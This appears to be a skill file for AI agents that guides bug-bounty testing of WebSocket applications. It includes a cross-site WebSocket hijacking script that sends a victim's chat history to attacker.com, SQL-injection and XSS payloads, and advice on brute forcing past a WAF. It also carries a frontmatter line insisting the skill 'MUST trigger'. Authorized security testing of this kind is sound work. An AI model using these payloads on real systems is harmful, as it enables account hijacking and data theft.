---
name: websocket-hijacking-testing
description: >
  [CRITICAL: MUST trigger this skill whenever related vulnerability testing is discussed.]
  Identify and exploit vulnerabilities within WebSocket communications, including Cross-Site
  WebSocket Hijacking (CSWSH), unauthenticated message spoofing, and data manipulation. Use this
  skill when auditing real-time applications such as trading platforms, live chat applications,
  or collaborative dashboards.
domain: cybersecurity
subdomain: bug-hunting
category: Web Vulnerabilities
difficulty: advanced
estimated_time: "2-4 hours"
mitre_attack:
  tactics: [TA0001, TA0011]
  techniques: [T1190, T1534]
platforms: [linux, windows]
tags: [websockets, cswsh, hijacking, message-spoofing, real-time-api, bug-hunting]
tools: [burpsuite, python]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# WebSocket Security and Hijacking

## When to Use
- When traffic relies on `wss://` (WebSocket Secure) protocol instead of standard HTTPS API requests.
- When attacking applications boasting "real-time" sync (live stock tickers, crypto charts, messaging apps, multiplayer games).
- To detect Cross-Site WebSocket Hijacking (CSWSH), which allows an attacker to establish a valid bidirectional socket over the victim's session.


## Prerequisites
- Authorized scope and target URLs from bug bounty program
- Burp Suite Professional (or Community) configured with browser proxy
- Familiarity with OWASP Top 10 and common web vulnerability classes
- SecLists wordlists for fuzzing and enumeration

## Workflow

### Phase 1: Analyzing the Handshake

```http
# Concept: WebSockets begin life as a standard HTTP GET request seeking an "Upgrade"
# to the WebSocket protocol. If the server authenticates this solely via Cookies without
# CSRF protection (like an Anti-CSRF token), it is vulnerable to CSWSH.

# 1. Intercept the Connection Upgrade in Burp Suite
GET /chat/socket HTTP/1.1
Host: wss.target.com
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Version: 13
Cookie: session_id=xyz123...

# Observe: Is there an Anti-CSRF token in the URL or headers? (e.g., `?token=random123`)
# If NO, and the connection relies strictly on the `session_id` cookie, proceed to Phase 2.
```

### Phase 2: Cross-Site WebSocket Hijacking (CSWSH) Execution

```html
<!-- Concept: Similar to CSRF, we trick the victim's browser into executing an action. -->
<!-- However, CSWSH is devastating because the attacker gains a persistent, TWO-WAY 
     read/write connection to the application, unlike normal CSRF which is "fire and forget". -->

<!-- 1. Host this exploit payload on attacker.com -->
<!-- When the victim views this page, their browser automatically attaches their `session_id` cookie. -->

<script>
    // Initiate the WebSocket connection to the target
    var ws = new WebSocket('wss://wss.target.com/chat/socket');
    
    // When the socket opens, send a command simulating the victim
    ws.onopen = function() {
        ws.send(JSON.stringify({"action": "get_chat_history"}));
    };
    
    // When the server responds with the massive chat history payload...
    ws.onmessage = function(event) {
        // Exfiltrate the victim's read data back to our attacker server
        fetch('https://attacker.com/log', {
            method: 'POST',
            body: event.data
        });
    };
</script>
```

### Phase 3: Manipulating WebSocket Messages (In-Band Attacks)

```text
# Concept: Developers often assume that because it is a socket connection, standard
# web vulnerabilities (SQLi, XSS) don't apply. This is completely false.

# 1. Inspect the WS History tab in Burp Suite.
# 2. Replay/Modify incoming and outgoing JSON messages.

# Attack A: Blind SQL Injection via Sockets
Send: {"action": "fetch_user", "id": "1' OR SLEEP(10)--"}
# If the socket hangs for 10 seconds before replying, blind SQLi is confirmed.

# Attack B: Stored XSS
Send: {"message": "<img src=x onerror=alert(1)>", "room": "general"}
# All other connected clients immediately execute the XSS when their socket renders the chat.

# Attack C: IDOR (Insecure Direct Object Reference)
Send: {"action": "delete_message", "message_id": 999}
# If you can delete a message belonging to another user without permissions.
```

### Phase 4: Bypassing Rate Limits via Sockets

```text
# Concept: WAFs and rate-limiters are predominantly configured to monitor HTTP traffic (e.g., 5 POST requests per second).
# Once a WebSocket is established, it bypasses HTTP logging, allowing infinite message spam.

# Attack: Application Brute Forcing over WS
# Write a Python script using the `websockets` library to send 10,000 authentication attempts per second over a single established socket connection.
# The WAF will be completely blind to this because it only sees ONE established TCP connection.
```

#### Decision Point 🔀
```mermaid
flowchart TD
    A[Intercept WS Handshake] --> B{Relies solely on Cookies?}
    B -->|Yes| C{Contains Anti-CSRF Token / Sec-Token?}
    C -->|No| D[VULNERABLE: Execute Cross-Site WS Hijacking]
    B -->|No| E[Uses Authorization Headers (e.g., Bearer)]
    E --> F[Immune to CSWSH. Proceed to Message Manipulation.]
    C -->|Yes| F
    F --> G[Fuzz socket messages for XSS, SQLi, and IDOR]
```


### 🏆 Elite Chaining Strategy (Top 1% Hunter Methodology)

> **Core Principle**: A single finding is a $500 report. A chained exploit is a $50,000 report.
> The top 1% of hunters spend 40+ hours on a single target, understanding it better than
> the developers who built it. They automate discovery, not exploitation.

**Chaining Decision Tree:**
```mermaid
graph TD
    A[Finding Discovered] --> B{Severity?}
    B -->|Low/Info| C[Can it enable recon?]
    B -->|Medium| D[Can it escalate access?]
    B -->|High/Crit| E[Document + PoC immediately]
    C -->|Yes| F[Chain: InfoLeak → targeted attack]
    C -->|No| G[Log but deprioritize]
    D -->|Yes| H[Chain: Medium + Priv Esc = Critical]
    D -->|No| I[Submit standalone if impact clear]
    F --> J[Re-evaluate combined severity]
    H --> J
    E --> K[Test lateral movement potential]
    J --> L[Write consolidated report with full attack chain]
    K --> L
```

**Common High-Payout Chains:**
| Chain Pattern | Typical Bounty | Example |
|--|--|--|
| SSRF → Cloud Metadata → IAM Keys | $15,000-$50,000 | Webhook URL → AWS creds → S3 data |
| Open Redirect → OAuth Token Theft | $5,000-$15,000 | Login redirect → steal auth code |
| IDOR + GraphQL Introspection | $3,000-$10,000 | Enumerate users → access any account |
| Race Condition → Financial Impact | $10,000-$30,000 | Duplicate gift cards → unlimited funds |
| XSS → ATO via Cookie Theft | $2,000-$8,000 | Stored XSS on admin page → session hijack |
| Info Disclosure → API Key Reuse | $5,000-$20,000 | JS file → hardcoded API key → admin access |

**The "Architect" vs "Scanner" Mindset:**
- ❌ **Scanner Mindset**: Run nuclei on 10,000 subdomains, submit the first hit → duplicates
- ✅ **Architect Mindset**: Spend 2 weeks mapping ONE application's business logic, RBAC model, 
  and integration seams → find what no scanner ever will

## 🔵 Blue Team Detection & Defense
- **Origin Header Validation**: During the WebSocket handshake, the server must strictly validate the `Origin` header. If the initial request does not originate from a trusted frontend domain, reject the `101 Switching Protocols` upgrade.
- **Session Tokens vs Cookies**: Do not rely on ambient browser cookies for WebSocket authentication. Instead, authenticate the socket immediately after it opens by requiring the client to explicitly send a Bearer token or CSRF token in the first data frame.
- **Socket Rate Limiting**: Implement application-level rate limiting on the number of messages a single socket identifier can process per second to prevent brute-forcing and denial-of-service conditions.

## Key Concepts
| Concept | Description |
|---------|-------------|
| WebSocket | A protocol providing persistent, full-duplex communication channels over a single TCP connection |
| CSWSH | Cross-Site WebSocket Hijacking; an exploit allowing an attacker to establish a socket authenticated as the victim |
| Full-Duplex | Data can be transmitted in both directions simultaneously, independent of request/response cycles |

## Output Format
```
Bug Bounty Report: CSWSH leading to PII Exfiltration
====================================================
Vulnerability: Cross-Site WebSocket Hijacking
Severity: High (CVSS 8.1)
Target: wss://trading.target.com/live

Description:
The real-time trading application establishes a WebSocket connection using a standard HTTP upgrade request reliant solely on the user's ambient session cookie. The handshake mechanism fails to validate the `Origin` header and lacks any randomized CSRF tokens.

An attacker can host a malicious payload on an external site. When a logged-in trader visits the attacker's site, the browser silently establishes a WebSocket back to `trading.target.com`. Crucially, because WebSockets are bidirectional, the attacker's script can issue commands (e.g., `{"command": "get_portfolio"}`) and read the server's responses, bypassing Same-Origin Policy constraints entirely.

Reproduction Steps:
[Include HTML payload script]
1. Open the attacker HTML payload in a browser with an active trading session.
2. Observe network traffic reflecting the portfolio values being transmitted to the attacker's logging server.

Impact:
Complete exposure of real-time account data, trading history, and portfolio balances.
```


### 📝 Elite Report Writing (Top 1% Standard)

> **"The difference between a $500 and $50,000 report is the quality of the writeup."**
> — Vickie Li, Bug Bounty Bootcamp

**Title Format**: `[VulnType] in [Component] Allows [BusinessImpact]`
- ❌ "XSS Found" → This tells the triager nothing
- ✅ "Stored XSS in /admin/comments Allows Session Hijacking of All Moderators"

**Report Structure (HackerOne-Optimized):**
1. **Summary** (2-4 sentences — triager reads only this first): What broke, how, worst-case.
2. **CVSS 4.0 Vector** — Must be defensible; wrong CVSS destroys credibility.
3. **Attack Scenario** — 3-5 sentence narrative from attacker's perspective.
4. **Impact** — MUST include at least one real number: "Affects 4.2M users" not "affects many users".
5. **Steps to Reproduce** — Deterministic. A junior dev who has never seen this bug reproduces it exactly.
6. **PoC** — Copy-paste runnable. No placeholders. Match the exact HTTP method.
7. **Remediation** — Don't say "sanitize input." Give the exact code fix, before/after.
8. **CWE + References** — SSRF→CWE-918, IDOR→CWE-639, SQLi→CWE-89, XSS→CWE-79.

**Pre-Report Verification (5 Checks):**
1. 🔍 **Hallucination Detector** — Verify endpoints, CVEs, and code paths are real
2. 🤖 **AI Writing Pattern Check** — Remove "Certainly!", "It's worth noting", generic phrasing
3. 🧪 **PoC Reproducibility** — Payload syntax valid for context? Prerequisites stated?
4. 📋 **Duplicate Detection** — Is this a scanner-generic finding? Known public disclosure?
5. 📈 **Impact Plausibility** — Severity matches technical capability? No inflation?



## 💰 Industry Bounty Payout Statistics (2024-2025)

| Company/Platform | Total Paid | Highest Single | Year |
|-----------------|------------|---------------|------|
| **Google VRP** | $17.1M | $250,000 (CVE-2025-4609 Chrome sandbox escape) | 2025 |
| **Microsoft** | $16.6M | (Not disclosed) | 2024 |
| **Google VRP** | $11.8M | $100,115 (Chrome MiraclePtr Bypass) | 2024 |
| **HackerOne (all programs)** | $81M | $100,050 (crypto firm) | 2025 |
| **Meta/Facebook** | $2.3M | up to $300K (mobile code execution) | 2024 |
| **Crypto.com (HackerOne)** | $2M program | $2M max | 2024 |
| **1Password (Bugcrowd)** | $1M max | $1M (highest Bugcrowd ever) | 2024 |
| **Samsung** | $1M max | $1M (critical mobile flaws) | 2025 |

**Key Takeaway**: Google alone paid $17.1M in 2025 — a 40% increase YoY. Microsoft paid $16.6M.
The industry is paying more, not less. Average critical bounty on HackerOne: $3,700 (2023).

## 🔴 Red Team
- Extract assets and enumerate endpoints.
- Execute initial payloads leveraging documented vulnerabilities.

## References
- PortSwigger: [WebSocket security](https://portswigger.net/web-security/websockets)
- OWASP: [Testing for WebSockets](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/10-Testing_WebSockets)
- PayloadAllTheThings: [WebSocket vulnerabilities](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/WebSockets)
